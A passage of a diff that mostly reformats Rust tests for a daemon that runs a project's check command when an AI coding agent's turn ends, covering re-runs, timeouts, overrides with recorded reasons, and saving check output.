+        timeout_s,
+    }];
     let t = pane(d);
     let p = d.terms.get_mut(&t).unwrap();
     (p.agent, p.hooked, p.status) = (Some("claude".into()), true, Status::Working);
@@ -1854,12 +3447,21 @@ fn a_turn_end_runs_the_projects_check_and_a_pass_is_recorded() {
     let t = checked_agent(&mut d, "echo \"suite ok\"; exit 0", LONG_CHECK_S);
     end_turn(&mut d, t);
     let running = check_of(&d, t);
-    assert_eq!((running.state, running.command.as_str()), (CheckState::Checking, "echo \"suite ok\"; exit 0"));
-    assert!(d.snapshot().terms[&t].check().is_some(), "clients see it checking");
+    assert_eq!(
+        (running.state, running.command.as_str()),
+        (CheckState::Checking, "echo \"suite ok\"; exit 0")
+    );
+    assert!(
+        d.snapshot().terms[&t].check().is_some(),
+        "clients see it checking"
+    );
     assert!(finish_check(&mut d, &mut rx, SLOW_CHECK_WAIT));
     let done = check_of(&d, t);
     assert_eq!((done.state, done.exit_code), (CheckState::Passed, Some(0)));
-    assert_eq!(d.terms[&t].checks.headline().unwrap().output.trim(), "suite ok");
+    assert_eq!(
+        d.terms[&t].checks.headline().unwrap().output.trim(),
+        "suite ok"
+    );
     assert!(d.terms[&t].checks.dirty, "its tail is due to be saved");
     close(&mut d, &[t]);
 }
@@ -1873,7 +3475,10 @@ fn a_failing_check_records_its_exit_code_and_output() {
     assert!(finish_check(&mut d, &mut rx, SLOW_CHECK_WAIT));
     let info = check_of(&d, t);
     assert_eq!((info.state, info.exit_code), (CheckState::Failed, Some(3)));
-    assert_eq!(d.terms[&t].checks.headline().unwrap().output.trim(), "1 test failed");
+    assert_eq!(
+        d.terms[&t].checks.headline().unwrap().output.trim(),
+        "1 test failed"
+    );
     close(&mut d, &[t]);
 }
 
@@ -1881,16 +3486,30 @@ fn a_failing_check_records_its_exit_code_and_output() {
 fn a_failed_check_names_its_first_failing_line_and_a_rerun_clears_it() {
     let (rt, (mut d, mut rx)) = (runtime(), daemon());
     let _in_rt = rt.enter();
-    let t = checked_agent(&mut d, "echo running; echo \"FAIL tests/foo: boom\"; exit 1", LONG_CHECK_S);
+    let t = checked_agent(
+        &mut d,
+        "echo running; echo \"FAIL tests/foo: boom\"; exit 1",
+        LONG_CHECK_S,
+    );
     end_turn(&mut d, t);
-    assert!(check_of(&d, t).first_failing_line.is_empty(), "nothing while it runs");
+    assert!(
+        check_of(&d, t).first_failing_line.is_empty(),
+        "nothing while it runs"
+    );
     assert!(finish_check(&mut d, &mut rx, SLOW_CHECK_WAIT));
     assert_eq!(check_of(&d, t).first_failing_line, "FAIL tests/foo: boom");
-    let seen = d.snapshot().terms[&t].check().cloned().expect("the summary is in the snapshot");
+    let seen = d.snapshot().terms[&t]
+        .check()
+        .cloned()
+        .expect("the summary is in the snapshot");
     assert_eq!(seen.first_failing_line, "FAIL tests/foo: boom");
     d.terms.get_mut(&t).unwrap().status = Status::Idle;
-    d.rerun_check(t, None).expect("a failed check can be run again");
-    assert!(check_of(&d, t).first_failing_line.is_empty(), "a re-run starts clean");
+    d.rerun_check(t, None)
+        .expect("a failed check can be run again");
+    assert!(
+        check_of(&d, t).first_failing_line.is_empty(),
+        "a re-run starts clean"
+    );
     assert!(finish_check(&mut d, &mut rx, SLOW_CHECK_WAIT));
     close(&mut d, &[t]);
 }
@@ -1899,12 +3518,19 @@ fn a_failed_check_names_its_first_failing_line_and_a_rerun_clears_it() {
 fn a_check_that_outruns_its_timeout_reads_as_not_run() {
     let (rt, (mut d, mut rx)) = (runtime(), daemon());
     let _in_rt = rt.enter();
-    let slow = if cfg!(windows) { "Start-Sleep 60" } else { "sleep 60" };
+    let slow = if cfg!(windows) {
+        "Start-Sleep 60"
+    } else {
+        "sleep 60"
+    };
     let t = checked_agent(&mut d, slow, 1);
     end_turn(&mut d, t);
     assert!(finish_check(&mut d, &mut rx, SLOW_CHECK_WAIT));
     let info = check_of(&d, t);
-    assert_eq!((info.state, info.exit_code), (CheckState::CouldNotRun, None));
+    assert_eq!(
+        (info.state, info.exit_code),
+        (CheckState::CouldNotRun, None)
+    );
     close(&mut d, &[t]);
 }
 
@@ -1913,7 +3539,11 @@ fn a_check_that_outruns_its_timeout_reads_as_not_run() {
 fn a_check_whose_command_is_not_found_reads_as_not_run() {
     let (rt, (mut d, mut rx)) = (runtime(), daemon());
     let _in_rt = rt.enter();
-    let t = checked_agent(&mut d, concat!(env!("APP_COMMAND"), "-no-such-command-xyz"), LONG_CHECK_S);
+    let t = checked_agent(
+        &mut d,
+        concat!(env!("APP_COMMAND"), "-no-such-command-xyz"),
+        LONG_CHECK_S,
+    );
     end_turn(&mut d, t);
     assert!(finish_check(&mut d, &mut rx, SLOW_CHECK_WAIT));
     assert_eq!(check_of(&d, t).state, CheckState::CouldNotRun);
@@ -1928,7 +3558,11 @@ fn a_shell_that_cannot_start_leaves_the_check_not_run() {
     d.cfg.shell = Some(concat!("/no/such/shell-for-", env!("APP_COMMAND")).into());
     end_turn(&mut d, t);
     assert!(finish_check(&mut d, &mut rx, SLOW_CHECK_WAIT));
-    assert_eq!(check_of(&d, t).state, CheckState::CouldNotRun, "never stuck checking");
+    assert_eq!(
+        check_of(&d, t).state,
+        CheckState::CouldNotRun,
+        "never stuck checking"
+    );
     close(&mut d, &[t]);
 }
 
@@ -1938,7 +3572,10 @@ fn the_screen_ending_a_turn_runs_the_check_too_but_a_cancelled_turn_does_not() {
     let _in_rt = rt.enter();
     let t = checked_agent(&mut d, "exit 0", LONG_CHECK_S);
     d.set_status(t, Status::Idle, "progress bar gone, no turn end: cancelled");
-    assert!(d.terms[&t].checks.points.is_empty(), "an interrupted turn finished nothing");
+    assert!(
+        d.terms[&t].checks.points.is_empty(),
+        "an interrupted turn finished nothing"
+    );
     d.set_status(t, Status::Working, "test");
     d.set_status(t, Status::Done, "screen: went quiet after working");
     assert_eq!(check_of(&d, t).state, CheckState::Checking);
@@ -1955,24 +3592,61 @@ fn sessions_without_a_check_a_shell_or_a_finished_turn_behave_as_before() {
     let t = checked_agent(&mut d, "exit 0", LONG_CHECK_S);
     d.cfg.check[0].project = std::env::temp_dir().join("some-other-project");
     end_turn(&mut d, t);
-    assert!(d.terms[&t].checks.points.is_empty(), "no check in this project");
+    assert!(
+        d.terms[&t].checks.points.is_empty(),
+        "no check in this project"
+    );
     assert_eq!(d.terms[&t].status, Status::Done, "and done as ever");
     // A shell pane in a project with a check.
     d.cfg.check[0].project = std::env::temp_dir();
     let shell = pane(&mut d);
     d.terms.get_mut(&shell).unwrap().status = Status::Working;
     d.set_status(shell, Status::Done, "test");
-    assert!(d.terms[&shell].checks.points.is_empty(), "a shell is not an agent");
+    assert!(
+        d.terms[&shell].checks.points.is_empty(),
+        "a shell is not an agent"
+    );
     // A turn that has not ended: working, asking, or held for its helpers.
     let busy = pane(&mut d);
-    (d.terms.get_mut(&busy).unwrap().agent, d.terms.get_mut(&busy).unwrap().hooked) = (Some("claude".into()), true);
-    d.hook(busy, "claude".into(), HookStatus::Working, "UserPromptSubmit", &[]);
-    d.hook(busy, "claude".into(), HookStatus::Blocked, "PreToolUse", &[]);
-    d.terms.get_mut(&busy).unwrap().subagents.push(("sub".into(), "explore".into()));
+    (
+        d.terms.get_mut(&busy).unwrap().agent,
+        d.terms.get_mut(&busy).unwrap().hooked,
+    ) = (Some("claude".into()), true);
+    d.hook(
+        busy,
+        "claude".into(),
+        HookStatus::Working,
+        "UserPromptSubmit",
+        &[],
+    );
+    d.hook(
+        busy,
+        "claude".into(),
+        HookStatus::Blocked,
+        "PreToolUse",
+        &[],
+    );
+    d.terms
+        .get_mut(&busy)
+        .unwrap()
+        .subagents
+        .push(("sub".into(), "explore".into()));
     d.hook(busy, "claude".into(), HookStatus::Done, "Stop", &[]);
-    assert!(d.terms[&busy].checks.points.is_empty(), "a turn waiting on its helpers has not ended");
-    d.hook(busy, "claude".into(), HookStatus::Done, "Notification:idle_prompt", &[]);
-    assert!(d.terms[&busy].checks.points.is_empty(), "a repeated idle ping is not a turn end");
+    assert!(
+        d.terms[&busy].checks.points.is_empty(),
+        "a turn waiting on its helpers has not ended"
+    );
+    d.hook(
+        busy,
+        "claude".into(),
+        HookStatus::Done,
+        "Notification:idle_prompt",
+        &[],
+    );
+    assert!(
+        d.terms[&busy].checks.points.is_empty(),
+        "a repeated idle ping is not a turn end"
+    );
     close(&mut d, &[t, shell, busy]);
 }
 
@@ -1983,11 +3657,24 @@ fn a_turn_ending_while_its_check_runs_does_not_start_a_second_run() {
     let t = checked_agent(&mut d, "exit 0", LONG_CHECK_S);
     end_turn(&mut d, t);
     let first = check_of(&d, t);
-    d.hook(t, "claude".into(), HookStatus::Working, "UserPromptSubmit", &[]);
+    d.hook(
+        t,
+        "claude".into(),
+        HookStatus::Working,
+        "UserPromptSubmit",
+        &[],
+    );
     end_turn(&mut d, t);
-    assert_eq!(check_of(&d, t), first, "the running check is left as it was");
+    assert_eq!(
+        check_of(&d, t),
+        first,
+        "the running check is left as it was"
+    );
     assert!(finish_check(&mut d, &mut rx, SLOW_CHECK_WAIT));
-    assert!(!finish_check(&mut d, &mut rx, Duration::from_millis(500)), "only one run was started");
+    assert!(
+        !finish_check(&mut d, &mut rx, Duration::from_millis(500)),
+        "only one run was started"
+    );
     close(&mut d, &[t]);
 }
 
@@ -2001,11 +3688,28 @@ fn a_done_hook_after_the_screen_ended_the_turn_and_its_check_settled_starts_no_s
     let settled = check_of(&d, t);
     assert_eq!(settled.state, CheckState::Passed);
     end_turn(&mut d, t);
-    assert_eq!(check_of(&d, t), settled, "the same turn is not checked twice");
-    assert!(!finish_check(&mut d, &mut rx, Duration::from_millis(500)), "no second run was started");
-    d.hook(t, "claude".into(), HookStatus::Working, "UserPromptSubmit", &[]);
+    assert_eq!(
+        check_of(&d, t),
+        settled,
+        "the same turn is not checked twice"
+    );
+    assert!(
+        !finish_check(&mut d, &mut rx, Duration::from_millis(500)),
+        "no second run was started"
+    );
+    d.hook(
+        t,
+        "claude".into(),
+        HookStatus::Working,
+        "UserPromptSubmit",
+        &[],
+    );
     end_turn(&mut d, t);
-    assert_eq!(check_of(&d, t).state, CheckState::Checking, "a new turn is checked");
+    assert_eq!(
+        check_of(&d, t).state,
+        CheckState::Checking,
+        "a new turn is checked"
+    );
     assert!(finish_check(&mut d, &mut rx, SLOW_CHECK_WAIT));
     close(&mut d, &[t]);
 }
@@ -2018,7 +3722,13 @@ fn the_next_turn_end_checks_again() {
     end_turn(&mut d, t);
     assert!(finish_check(&mut d, &mut rx, SLOW_CHECK_WAIT));
     assert_eq!(check_of(&d, t).state, CheckState::Failed);
-    d.hook(t, "claude".into(), HookStatus::Working, "UserPromptSubmit", &[]);
+    d.hook(
+        t,
+        "claude".into(),
+        HookStatus::Working,
+        "UserPromptSubmit",
+        &[],
+    );
     end_turn(&mut d, t);
     assert_eq!(check_of(&d, t).state, CheckState::Checking);
     assert!(finish_check(&mut d, &mut rx, SLOW_CHECK_WAIT));
@@ -2032,7 +3742,10 @@ fn a_result_for_a_pane_that_closed_is_dropped() {
     let t = checked_agent(&mut d, "exit 0", LONG_CHECK_S);
     end_turn(&mut d, t);
     close(&mut d, &[t]);
-    assert!(finish_check(&mut d, &mut rx, SLOW_CHECK_WAIT), "the result still arrives and is ignored");
+    assert!(
+        finish_check(&mut d, &mut rx, SLOW_CHECK_WAIT),
+        "the result still arrives and is ignored"
+    );
     assert!(!d.terms.contains_key(&t));
 }
 
@@ -2045,13 +3758,33 @@ fn the_tail_of_a_closed_pane_goes_on_a_full_save_even_when_no_tail_changed() {
     let unsaved = persist::save_check_outputs(
         tails.path(),
         persist::save_ticket(),
-        &[persist::CheckTail { term: open, name: String::new(), slot: persist::CheckSlot::Latest, text: "kept".into() }, persist::CheckTail { term: closed, name: String::new(), slot: persist::CheckSlot::Latest, text: "gone".into() }],
+        &[
+            persist::CheckTail {
+                term: open,
+                name: String::new(),
+                slot: persist::CheckSlot::Latest,
+                text: "kept".into(),
+            },
+            persist::CheckTail {
+                term: closed,
+                name: String::new(),
+                slot: persist::CheckSlot::Latest,
+                text: "gone".into(),
+            },
+        ],
         &[open, closed],
     );
     assert!(unsaved.is_empty());
     d.save_check_tails(persist::save_ticket(), vec![open], true);
-    assert_eq!(persist::read_check_output(tails.path(), closed, "", persist::CheckSlot::Latest), None, "pruned at shutdown");
-    assert_eq!(persist::read_check_output(tails.path(), open, "", persist::CheckSlot::Latest).as_deref(), Some("kept"));
+    assert_eq!(
+        persist::read_check_output(tails.path(), closed, "", persist::CheckSlot::Latest),
+        None,
+        "pruned at shutdown"
+    );
+    assert_eq!(
+        persist::read_check_output(tails.path(), open, "", persist::CheckSlot::Latest).as_deref(),
+        Some("kept")
+    );
     close(&mut d, &[open]);
 }
 
@@ -2068,11 +3801,17 @@ fn a_tail_that_failed_to_write_is_written_again_at_the_next_save() {
     d.terms.get_mut(&t).unwrap().checks.points = vec![failed_check("FAIL footer\n").into()];
     d.terms.get_mut(&t).unwrap().checks.dirty = true;
     d.save_check_tails(persist::save_ticket(), vec![t], true);
-    assert!(d.terms[&t].checks.dirty, "still due: the write did not happen");
+    assert!(
+        d.terms[&t].checks.dirty,
+        "still due: the write did not happen"
+    );
     std::fs::remove_file(&d.check_dir).unwrap();
     d.save_check_tails(persist::save_ticket(), vec![t], true);
     assert!(!d.terms[&t].checks.dirty);
-    assert_eq!(persist::read_check_output(&d.check_dir, t, "", persist::CheckSlot::Latest).as_deref(), Some("FAIL footer\n"));
+    assert_eq!(
+        persist::read_check_output(&d.check_dir, t, "", persist::CheckSlot::Latest).as_deref(),
+        Some("FAIL footer\n")
+    );
     close(&mut d, &[t]);
 }
 
@@ -2085,7 +3824,11 @@ fn a_background_save_that_fails_marks_its_tails_due_again() {
     d.terms.get_mut(&t).unwrap().checks.dirty = true;
     assert_eq!(d.take_dirty_check_outputs().len(), 1);
     d.handle(Ev::CheckOutputsUnsaved(vec![t, 9_999]));
-    assert_eq!(d.take_dirty_check_outputs().len(), 1, "due again; a pane that is gone is skipped");
+    assert_eq!(
+        d.take_dirty_check_outputs().len(),
+        1,
+        "due again; a pane that is gone is skipped"
+    );
     close(&mut d, &[t]);
 }
 
@@ -2095,12 +3838,35 @@ fn a_restored_tail_stays_on_disk_until_the_new_one_is_saved() {
     let tails = persist::scratch_dir();
     d.check_dir = tails.path().to_path_buf();
     let old: TermId = 9_301;
-    assert!(persist::save_check_outputs(tails.path(), persist::save_ticket(), &[persist::CheckTail { term: old, name: String::new(), slot: persist::CheckSlot::Latest, text: "tail".into() }], &[old]).is_empty());
+    assert!(
+        persist::save_check_outputs(
+            tails.path(),
+            persist::save_ticket(),
+            &[persist::CheckTail {
+                term: old,
+                name: String::new(),
+                slot: persist::CheckSlot::Latest,
+                text: "tail".into()
+            }],
+            &[old]
+        )
+        .is_empty()
+    );
     let t = pane(&mut d);
-    let saved = persist::SavedPane { checks: vec![failed_check("").info], ..Default::default() };
+    let saved = persist::SavedPane {
+        checks: vec![failed_check("").info],
+        ..Default::default()
+    };
     let dir = d.check_dir.clone();
-    d.terms.get_mut(&t).unwrap().restore_checks(&dir, old, &saved);
-    assert_eq!(persist::read_check_output(tails.path(), old, "", persist::CheckSlot::Latest).as_deref(), Some("tail"), "a crash now loses nothing");
+    d.terms
+        .get_mut(&t)
+        .unwrap()
+        .restore_checks(&dir, old, &saved);
+    assert_eq!(
+        persist::read_check_output(tails.path(), old, "", persist::CheckSlot::Latest).as_deref(),
+        Some("tail"),
+        "a crash now loses nothing"
+    );
     close(&mut d, &[t]);
 }
 
@@ -2110,17 +3876,43 @@ fn a_tail_kept_before_checkpoints_had_names_is_restored_only_into_a_lone_checkpo
     let tails = persist::scratch_dir();
     std::fs::create_dir_all(tails.path()).unwrap();
     let old: TermId = 9_302;
-    std::fs::write(tails.path().join(format!("{old}-latest.txt")), "old single check").unwrap();
+    std::fs::write(
+        tails.path().join(format!("{old}-latest.txt")),
+        "old single check",
+    )
+    .unwrap();
     let dir = tails.path().to_path_buf();
-    let info = |name: &str| CheckInfo { name: name.into(), state: CheckState::Failed, ..Default::default() };
+    let info = |name: &str| CheckInfo {
+        name: name.into(),
+        state: CheckState::Failed,
+        ..Default::default()
+    };
     let t = pane(&mut d);
-    let two = persist::SavedPane { checks: vec![info("build"), info("test")], ..Default::default() };
+    let two = persist::SavedPane {
+        checks: vec![info("build"), info("test")],
+        ..Default::default()
+    };
     d.terms.get_mut(&t).unwrap().restore_checks(&dir, old, &two);
-    let outputs: Vec<&str> = d.terms[&t].checks.points.iter().map(|p| p.latest.output.as_str()).collect();
-    assert_eq!(outputs, ["", ""], "neither of two checkpoints is the old single check");
-    let one = persist::SavedPane { checks: vec![info("test")], ..Default::default() };
+    let outputs: Vec<&str> = d.terms[&t]
+        .checks
+        .points
+        .iter()
+        .map(|p| p.latest.output.as_str())
+        .collect();
+    assert_eq!(
+        outputs,
+        ["", ""],
+        "neither of two checkpoints is the old single check"
+    );
+    let one = persist::SavedPane {
+        checks: vec![info("test")],
+        ..Default::default()
+    };
     d.terms.get_mut(&t).unwrap().restore_checks(&dir, old, &one);
-    assert_eq!(d.terms[&t].checks.points[0].latest.output, "old single check", "a lone checkpoint is the migrated one");
+    assert_eq!(
+        d.terms[&t].checks.points[0].latest.output, "old single check",
+        "a lone checkpoint is the migrated one"
+    );
     close(&mut d, &[t]);
 }
 
@@ -2130,21 +3922,51 @@ fn a_repo_checks_file_is_only_noticed_once_the_worktree_was_looked_at() {
     let _in_rt = rt.enter();
     let repo = temp_repo();
     std::fs::create_dir_all(repo.path().join(concat!(".", env!("APP_COMMAND")))).unwrap();
-    std::fs::write(repo.path().join(crate::config::REPO_CHECKS_FILE), "[[check]]
+    std::fs::write(
+        repo.path().join(crate::config::REPO_CHECKS_FILE),
+        "[[check]]
 name = \"test\"
 command = \"echo tested\"
-").unwrap();
+",
+    )
+    .unwrap();
     let t = agent_with_checkpoints(&mut d, repo.path(), &[]);
-    let err = d.command(0, Command::RerunCheck { term: t, name: None }).expect_err("not looked at yet");
+    let err = d
+        .command(
+            0,
+            Command::RerunCheck {
+                term: t,
+                name: None,
+            },
+        )
+        .expect_err("not looked at yet");
     assert!(err.to_string().contains("no check"), "{err}");
     look_for_repo_checks(&mut d, &mut rx, t);
     std::fs::remove_file(repo.path().join(crate::config::REPO_CHECKS_FILE)).unwrap();
     let p = d.terms.get_mut(&t).unwrap();
     p.status = Status::Done;
-    assert!(d.command(0, Command::RerunCheck { term: t, name: None }).is_ok(), "the last look is what counts; the run settles what the file names");
+    assert!(
+        d.command(
+            0,
+            Command::RerunCheck {
+                term: t,
+                name: None
+            }
+        )
+        .is_ok(),
+        "the last look is what counts; the run settles what the file names"
+    );
     finish_run(&mut d, &mut rx, t);
     look_for_repo_checks(&mut d, &mut rx, t);
-    let err = d.command(0, Command::RerunCheck { term: t, name: None }).expect_err("gone at the next look");
+    let err = d
+        .command(
+            0,
+            Command::RerunCheck {
+                term: t,
+                name: None,
+            },
+        )
+        .expect_err("gone at the next look");
     assert!(err.to_string().contains("no check"), "{err}");
     close(&mut d, &[t]);
 }
@@ -2152,8 +3974,19 @@ command = \"echo tested\"
 fn with_check(d: &mut Daemon, t: TermId, state: CheckState, output: &str) {
     let record = failed_check(output);
     // Named as the project's checkpoint is, so a run finds it.
-    let name = d.cfg.check.first().map(|c| c.name().to_string()).unwrap_or_default();
-    let info = CheckInfo { name, state, exit_code: (state == CheckState::Failed).then_some(1), after_turn_ended_at: 77, ..record.info };
+    let name = d
+        .cfg
+        .check
+        .first()
+        .map(|c| c.name().to_string())
+        .unwrap_or_default();
+    let info = CheckInfo {
+        name,
+        state,
+        exit_code: (state == CheckState::Failed).then_some(1),
+        after_turn_ended_at: 77,
+        ..record.info
+    };
     d.terms.get_mut(&t).unwrap().checks.points = vec![check::CheckRecord::new(info, output).into()];
 }
 
@@ -2163,16 +3996,41 @@ fn a_rerun_while_the_agent_works_waits_for_the_turn_to_end() {
     let _in_rt = rt.enter();
     let t = checked_agent(&mut d, "echo again; exit 0", LONG_CHECK_S);
     with_check(&mut d, t, CheckState::Failed, "old failure");
-    d.command(0, Command::RerunCheck { term: t, name: None }).unwrap();
+    d.command(
+        0,
+        Command::RerunCheck {
+            term: t,
+            name: None,
+        },
+    )
+    .unwrap();
     let waiting = check_of(&d, t);
-    assert_eq!((waiting.state, waiting.rerun_queued), (CheckState::Failed, true), "the result stands, and says a re-run is queued");
-    assert!(d.snapshot().terms[&t].check().is_some_and(|c| c.rerun_queued), "clients see it");
-    assert!(!finish_check(&mut d, &mut rx, Duration::from_millis(300)), "nothing runs mid-turn");
+    assert_eq!(
+        (waiting.state, waiting.rerun_queued),
+        (CheckState::Failed, true),
+        "the result stands, and says a re-run is queued"
+    );
+    assert!(
+        d.snapshot().terms[&t]
+            .check()
+            .is_some_and(|c| c.rerun_queued),
+        "clients see it"
+    );
+    assert!(
+        !finish_check(&mut d, &mut rx, Duration::from_millis(300)),
+        "nothing runs mid-turn"
+    );
     end_turn(&mut d, t);
     let running = check_of(&d, t);
-    assert_eq!((running.state, running.rerun_queued), (CheckState::Checking, false));
+    assert_eq!(
+        (running.state, running.rerun_queued),
+        (CheckState::Checking, false)
+    );
     assert!(finish_check(&mut d, &mut rx, SLOW_CHECK_WAIT));
-    assert!(!finish_check(&mut d, &mut rx, Duration::from_millis(500)), "the queued re-run and the turn end are one run");
+    assert!(
+        !finish_check(&mut d, &mut rx, Duration::from_millis(500)),
+        "the queued re-run and the turn end are one run"
+    );
     assert_eq!(check_of(&d, t).state, CheckState::Passed);
     close(&mut d, &[t]);
 }
@@ -2183,7 +4041,14 @@ fn a_queued_rerun_is_dropped_when_the_project_no_longer_has_a_check() {
     let _in_rt = rt.enter();
     let t = checked_agent(&mut d, "exit 0", LONG_CHECK_S);
     with_check(&mut d, t, CheckState::Failed, "old");
-    d.command(0, Command::RerunCheck { term: t, name: None }).unwrap();
+    d.command(
+        0,
+        Command::RerunCheck {
+            term: t,
+            name: None,
+        },
+    )
+    .unwrap();
     d.cfg.check.clear();
     end_turn(&mut d, t);
     assert!(!check_of(&d, t).rerun_queued, "nothing is queued any more");
@@ -2197,12 +4062,29 @@ fn a_rerun_of_an_idle_agent_starts_at_once_and_replaces_the_settled_result() {
     let t = checked_agent(&mut d, "echo fresh; exit 0", LONG_CHECK_S);
     d.terms.get_mut(&t).unwrap().status = Status::Done;
     with_check(&mut d, t, CheckState::Failed, "old failure");
-    d.command(0, Command::RerunCheck { term: t, name: None }).unwrap();
+    d.command(
+        0,
+        Command::RerunCheck {
+            term: t,
+            name: None,
+        },
+    )
+    .unwrap();
     let running = check_of(&d, t);
-    assert_eq!((running.state, running.after_turn_ended_at, running.rerun_queued), (CheckState::Checking, 77, false));
+    assert_eq!(
+        (
+            running.state,
+            running.after_turn_ended_at,
+            running.rerun_queued
+        ),
+        (CheckState::Checking, 77, false)
+    );
     assert!(finish_check(&mut d, &mut rx, SLOW_CHECK_WAIT));
     assert_eq!(check_of(&d, t).state, CheckState::Passed);
-    assert_eq!(d.terms[&t].checks.headline().unwrap().output.trim(), "fresh");
+    assert_eq!(
+        d.terms[&t].checks.headline().unwrap().output.trim(),
+        "fresh"
+    );
     close(&mut d, &[t]);
 }
 
@@ -2211,16 +4093,66 @@ fn a_rerun_that_has_nothing_to_run_is_an_error() {
     let (rt, (mut d, _rx)) = (runtime(), daemon());
     let _in_rt = rt.enter();
     let t = checked_agent(&mut d, "exit 0", LONG_CHECK_S);
-    assert!(d.command(0, Command::RerunCheck { term: t, name: None }).is_err(), "working, never checked: its turn end checks it");
+    assert!(
+        d.command(
+            0,
+            Command::RerunCheck {
+                term: t,
+                name: None
+            }
+        )
+        .is_err(),
+        "working, never checked: its turn end checks it"
+    );
     d.terms.get_mut(&t).unwrap().status = Status::Done;
     with_check(&mut d, t, CheckState::Checking, "");
-    assert!(d.command(0, Command::RerunCheck { term: t, name: None }).is_err(), "already running");
+    assert!(
+        d.command(
+            0,
+            Command::RerunCheck {
+                term: t,
+                name: None
+            }
+        )
+        .is_err(),
+        "already running"
+    );
     d.cfg.check.clear();
     with_check(&mut d, t, CheckState::Failed, "");
-    assert!(d.command(0, Command::RerunCheck { term: t, name: None }).is_err(), "no check in this project");
+    assert!(
+        d.command(
+            0,
+            Command::RerunCheck {
+                term: t,
+                name: None
+            }
+        )
+        .is_err(),
+        "no check in this project"
+    );
     let shell = pane(&mut d);
-    assert!(d.command(0, Command::RerunCheck { term: shell, name: None }).is_err(), "a shell is not checked");
-    assert!(d.command(0, Command::RerunCheck { term: 9_999, name: None }).is_err(), "no such pane");
+    assert!(
+        d.command(
+            0,
+            Command::RerunCheck {
+                term: shell,
+                name: None
+            }
+        )
+        .is_err(),
+        "a shell is not checked"
+    );
+    assert!(
+        d.command(
+            0,
+            Command::RerunCheck {
+                term: 9_999,
+                name: None
+            }
+        )
+        .is_err(),
+        "no such pane"
+    );
     close(&mut d, &[t, shell]);
 }
 
@@ -2228,9 +4160,18 @@ fn a_rerun_that_has_nothing_to_run_is_an_error() {
 fn only_a_failed_check_can_be_overridden_and_the_override_is_recorded() {
     let (mut d, _rx) = daemon();
     let t = pane(&mut d);
-    let cmd = |reason: &str| Command::OverrideCheck { term: t, name: None, reason: reason.into() };
+    let cmd = |reason: &str| Command::OverrideCheck {
+        term: t,
+        name: None,
+        reason: reason.into(),
+    };
     assert!(d.command(0, cmd("")).is_err(), "no result");
-    for state in [CheckState::Passed, CheckState::Checking, CheckState::CouldNotRun, CheckState::Overridden] {
+    for state in [
+        CheckState::Passed,
+        CheckState::Checking,
+        CheckState::CouldNotRun,
+        CheckState::Overridden,
+    ] {
         with_check(&mut d, t, state, "out");
         assert!(d.command(0, cmd("")).is_err(), "{state:?}");
         assert_eq!(check_of(&d, t).state, state, "left as it was");
@@ -2239,12 +4180,32 @@ fn only_a_failed_check_can_be_overridden_and_the_override_is_recorded() {
     let before = term::unix_now();
     d.command(0, cmd("  flaky on CI  ")).unwrap();
     let info = check_of(&d, t);
-    assert_eq!((info.state, info.override_reason.as_str(), info.exit_code), (CheckState::Overridden, "flaky on CI", Some(1)));
-    assert!(info.overridden_at.is_some_and(|at| at >= before), "the time is recorded");
-    assert_eq!(d.snapshot().terms[&t].check().map(|c| c.state), Some(CheckState::Overridden));
+    assert_eq!(
+        (info.state, info.override_reason.as_str(), info.exit_code),
+        (CheckState::Overridden, "flaky on CI", Some(1))
+    );
+    assert!(
+        info.overridden_at.is_some_and(|at| at >= before),
+        "the time is recorded"
+    );
+    assert_eq!(
+        d.snapshot().terms[&t].check().map(|c| c.state),
+        Some(CheckState::Overridden)
+    );
     let term = &d.terms[&t];
-    assert_eq!(term.checks.headline().unwrap().output, "FAIL a\nFAIL b\n", "the failure's output stays");
-    assert_eq!(term.checks.points.first().and_then(|p| p.overridden.as_ref()).map(|c| (c.info.clone(), c.output.as_str())), Some((info, "FAIL a\nFAIL b\n")));
+    assert_eq!(
+        term.checks.headline().unwrap().output,
+        "FAIL a\nFAIL b\n",
+        "the failure's output stays"
+    );
+    assert_eq!(
+        term.checks
+            .points
+            .first()
+            .and_then(|p| p.overridden.as_ref())
+            .map(|c| (c.info.clone(), c.output.as_str())),
+        Some((info, "FAIL a\nFAIL b\n"))
+    );
     assert!(term.checks.dirty, "due to be saved");
     close(&mut d, &[t]);
 }
@@ -2255,9 +4216,27 @@ fn an_override_reason_is_optional_and_bounded() {
     let t = pane(&mut d);
     with_check(&mut d, t, CheckState::Failed, "");
     let too_long = "x".repeat(super::check::OVERRIDE_REASON_MAX_CHARS + 1);
-    assert!(d.command(0, Command::OverrideCheck { term: t, name: None, reason: too_long }).is_err());
+    assert!(
+        d.command(
+            0,
+            Command::OverrideCheck {
+                term: t,
+                name: None,
+                reason: too_long
+            }
+        )
+        .is_err()
+    );
     assert_eq!(check_of(&d, t).state, CheckState::Failed, "refused whole");
-    d.command(0, Command::OverrideCheck { term: t, name: None, reason: String::new() }).unwrap();
+    d.command(
+        0,
+        Command::OverrideCheck {
+            term: t,
+            name: None,
+            reason: String::new(),
+        },
+    )
+    .unwrap();
     assert_eq!(check_of(&d, t).override_reason, "");
     close(&mut d, &[t]);
 }
@@ -2268,12 +4247,53 @@ fn undoing_an_override_restores_the_failed_result() {
     let t = pane(&mut d);
     with_check(&mut d, t, CheckState::Failed, "FAIL a");
     let failed = check_of(&d, t);
-    assert!(d.command(0, Command::UndoOverride { term: t, name: None }).is_err(), "nothing to undo on a failure");
-    d.command(0, Command::OverrideCheck { term: t, name: None, reason: "r".into() }).unwrap();
-    d.command(0, Command::UndoOverride { term: t, name: None }).unwrap();
+    assert!(
+        d.command(
+            0,
+            Command::UndoOverride {
+                term: t,
+                name: None
+            }
+        )
+        .is_err(),
+        "nothing to undo on a failure"
+    );
+    d.command(
+        0,
+        Command::OverrideCheck {
+            term: t,
+            name: None,
+            reason: "r".into(),
+        },
+    )
+    .unwrap();
+    d.command(
+        0,
+        Command::UndoOverride {
+            term: t,
+            name: None,
+        },
+    )
+    .unwrap();
     assert_eq!(check_of(&d, t), failed, "exactly as it was");
-    assert!(d.terms[&t].checks.points.first().is_none_or(|p| p.overridden.is_none()));
-    assert!(d.command(0, Command::UndoOverride { term: t, name: None }).is_err(), "and only once");
+    assert!(
+        d.terms[&t]
+            .checks
+            .points
+            .first()
+            .is_none_or(|p| p.overridden.is_none())
+    );
+    assert!(
+        d.command(
+            0,
+            Command::UndoOverride {
+                term: t,
+                name: None
+            }
+        )
+        .is_err(),
+        "and only once"
+    );
     close(&mut d, &[t]);
 }
 
@@ -2284,14 +4304,44 @@ fn the_next_run_replaces_an_override_but_keeps_the_overridden_output() {
     let t = checked_agent(&mut d, "echo green; exit 0", LONG_CHECK_S);
